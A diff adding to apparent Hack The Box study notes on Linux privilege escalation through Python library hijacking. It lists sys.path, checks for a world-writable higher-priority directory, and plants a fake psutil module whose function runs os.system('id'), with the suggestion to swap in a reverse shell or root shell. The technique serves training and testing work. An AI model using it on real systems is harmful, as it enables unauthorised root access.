@@ -55,3 +55,46 @@ def virtual_memory():
 After confirming, we can change the command id into something like reverse shell or spawn root shell.
 
 If we can't alter the scripts, we can also attempt to hijack the whole script completely:
+```
+htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'
+
+/usr/lib/python38.zip
+/usr/lib/python3.8
+/usr/lib/python3.8/lib-dynload
+/usr/local/lib/python3.8/dist-packages
+/usr/lib/python3/dist-packages
+```
+
+Python import modules based on priority system, that means the module is loaded with preference from entry higher in the above, to hijack, we have 2 prerequisite:
+
+1.The original referenced file is located at somewhere at lower priority
+2.We have write permission to one of the paths that has higher priority
+
+
+We can see a module default installation location by issuing this command:
+```
+pip3 show <modulename>
+```
+
+Assuming the interested module is installed at /usr/lib/python3/dist-packages, now we have 4 candidates and we only need one directory that we have write access to:
+```
+htb-student@lpenix:~$ ls -la /usr/lib/python3.8
+
+total 4916
+drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
+...SNIP...
+```
+
+now we can create our own module, using previous example of psutil:
+```
+cat psutil.py
+
+#!/usr/bin/env python3
+
+import os
+
+def virtual_memory():
+    os.system('id')
+```
+
+We run the script again, if hijack is successful, we change payload to something else.
